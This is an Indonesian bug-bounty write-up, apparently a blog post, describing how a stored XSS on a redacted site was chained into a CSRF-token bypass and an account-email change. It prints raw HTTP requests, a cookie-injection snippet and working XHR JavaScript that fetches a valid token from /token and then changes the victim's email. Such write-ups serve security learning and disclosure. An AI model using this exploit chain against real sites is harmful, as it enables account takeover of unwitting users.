@@ -1,0 +1,191 @@
+I";%<p><img src="/images/2c71e977eccffb1cfb7c6cc22e0e7595-xss-to-0.png" alt="XSS" /></p>
+
+<p>Ketika melakukan Bug Hunting dan menemukan bug Stored XSS, biasanya khayalan akan mendapat bounty yg cukup besar sudah berputar-putar di kepala. Namun terkadang khayalan tersebut pudar ketika kita mencoba memasukan <code class="highlighter-rouge">document.cookie</code> ke dalam payload XSS dan yang muncul adalah:</p>
+
+<p><img src="/images/2c71e977eccffb1cfb7c6cc22e0e7595-xss-to-1-1.png" alt="Blank Alert" /></p>
+
+<p>Popup alert yang diharapkan menampilkan <code class="highlighter-rouge">cookie</code> dari website target namun malah tidak menampilkan apapun karena cookie pada website tersebut diset <code class="highlighter-rouge">HTTPOnly</code> sehingga tidak bisa diakses oleh javascript.</p>
+
+<p>Bila menemukan hal seperti ini, biasanya pilihan selanjutnya adalah dengan membuat request menggunakan XHR untuk ‘memaksa’ user melakukan aksi sensitif tanpa sepengetahuan mereka, sebagai contoh, merubah password atau mengganti alamat email.</p>
+
+<p>Dan ketika akan melakukan hal tersebut, Request yang dikirim seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: 3005c34f-4cea-4470-afe8-045f1c14a2af
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=3005c34f-4cea-4470-afe8-045f1c14a2af;
+
+{"email":"pwn@1337.com"}
+</code></pre></div></div>
+
+<p>Terlihat pada request header terdapat <code class="highlighter-rouge">csrf</code> token yang bertujuan untuk mencegah serangan CSRF. Maka tambah suram lah proses exploitasinya, semakin sulit karena ada CSRF header yang selalu berubah setiap kali melakukan request.</p>
+
+<p>Bila dilihat dengan seksama, pada request header dan cookie memiliki <code class="highlighter-rouge">csrf-token</code> dengan value yang sama. Maka saya mencoba untuk merubah kedua nilai tersebut menjadi nilai yang lain, namun tetap sama keduanya.</p>
+
+<p>Request:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: asu
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=asu;
+
+{"email":"pwn@1337.com"}
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"changingEmailCompleted":true}
+</code></pre></div></div>
+
+<p>Boom! Ternyata email berhasil dirubah menggunakan cara tersebut. Ini artinya kita dapat memanipulasi <code class="highlighter-rouge">csrf-token</code> pada header menjadi apapun asalkan nilainya sama dengan <code class="highlighter-rouge">csrf-token</code> pada cookie.</p>
+
+<p>Karena kita tidak dapat mengakses cookie, maka saya mencoba menambahkan cookie baru dengan menggunakan script berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;document.cookie="csrf-token=asu";&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Ketika dicoba melakukan request, response nya seperti berikut:</p>
+
+<p><img src="/images/2c71e977eccffb1cfb7c6cc22e0e7595-xss-to-2.png" alt="CSRF Failed" /></p>
+
+<p>Loh kok muncul pesan <code class="highlighter-rouge">Possible CSRF attack detected!</code>?</p>
+
+<p>Ketika dilakukan pengecekan ulang, ternyata requestnya menjadi seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: asu
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: csrf-token=asu; JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
+
+{"email":"pwn@1337.com"}
+</code></pre></div></div>
+
+<p>Terlihat ada 2 buat cookie bernama <code class="highlighter-rouge">csrf-token</code>, sepertinya ini yang menjadi penyebab error tadi.</p>
+
+<p>Karena kita tidak bila melakukan apa-apa pada cookie yang ada, maka yang dapat kita manfaatkan disini hanyalah <code class="highlighter-rouge">csrf-token</code> pada request header. Namun tentu saja kita harus mendapatkan nilai yang valid.</p>
+
+<p>Website ini dibangun menggunakan AngularJS, tidak ada nilai <code class="highlighter-rouge">csrf-token</code> yang tersimpan pada kode HTMLnya, dan nilai dari cookie selalu berubah-ubah setiap request.</p>
+
+<p>Wait, <code class="highlighter-rouge">selalu berubah-ubah setiap request</code>? Artinya ada saatnya dimana server mengirimkan cookie baru ke browser. Maka saya pun mencoba mencari kapan momen tersebut terjadi.</p>
+
+<p>Lalu ditemukan adanya request di background ke endpoint <code class="highlighter-rouge">/token</code> seperti berikut:</p>
+
+<p>Request:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /token HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: 0b84028f-35de-4bd6-bf72-a0a776a7b3f2
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Date: Fri, 04 Oct 2019 15:08:38 GMT
+Server: nginx
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Set-Cookie: csrf-token=725d97de-550d-4644-9579-d4b3e1209ded; path=/; secure; HttpOnly
+X-XSS-Protection: 1; mode=block
+Pragma: no-cache
+csrf-token: 725d97de-550d-4644-9579-d4b3e1209ded
+Content-Security-Policy: frame-ancestors 'self'
+X-Content-Type-Options: nosniff
+[...]
+</code></pre></div></div>
+
+<p>Terlihat bahwa ketika melakukan request ke endpoint <code class="highlighter-rouge">/token</code>, server meresponse dengan memberikan cookie <code class="highlighter-rouge">csrf-token</code> baru. Maka kita dapat memanfaatkan request ini untuk mengambil <code class="highlighter-rouge">csrf-token</code> tersebut, dengan menggunakan script seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var xhr = new XMLHttpRequest();
+var method = 'GET';
+var url = 'https://redacted.com/token';
+xhr.open(method,url,true);
+xhr.send(null);
+
+xhr.onreadystatechange = function()
+{
+ var token = xhr.getResponseHeader('csrf-token');
+ alert(token);
+}
+</code></pre></div></div>
+
+<p>Dan CSRF Token pun berhasil diperoleh!</p>
+
+<p><img src="/images/2c71e977eccffb1cfb7c6cc22e0e7595-xss-to-3-1.png" alt="CSRF Token" /></p>
+
+<p>Terakhir, tinggal menggabungkannya dengan request untuk change email tadi.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var xhr = new XMLHttpRequest();
+var method = 'GET';
+var url = 'https://redacted.com/token';
+xhr.open(method,url,true);
+xhr.send(null);
+
+xhr.onreadystatechange = function()
+{
+ var token = xhr.getResponseHeader('csrf-token'); // ngambil token dari response header
+
+ xhr.open("POST","https://redacted.com/user/changeEmail", true);
+ xhr.withCredentials="true";
+ xhr.setRequestHeader("csrf-token", token);
+ xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+ xhr.send('{"email":"pwn@1337.com"});
+}
+alert('Ups, You\'re pwned!');
+</code></pre></div></div>
+
+<p>Dan alamat email pun berhasil dirubah :))</p>
+
+<p><img src="/images/2c71e977eccffb1cfb7c6cc22e0e7595-xss-to-4.png" alt="Email Changed" /></p>
+
+<p><strong>Kesimpulan</strong></p>
+
+<ol>
+  <li>Ketika menemukan Stored XSS namun tidak bisa memperoleh cookie, jangan langsung laporkan karena besar kemungkinan severity akan menurun</li>
+  <li>Cobalah lakukan chaining dengan bug lain, CSRF misalnya untuk melakukan aksi sensitif</li>
+  <li>Ketika menemukan CSRF Protection, cobalah untuk menghapusnya atau merubah nilainya menjadi <code class="highlighter-rouge">null</code>, terkadang hal ajaib tersebut bisa berhasil</li>
+  <li>Carilah endpoint lain yang sekiranya dapat dimanfaatkan untuk memperolah CSRF Token yang valid</li>
+</ol>
+:ET
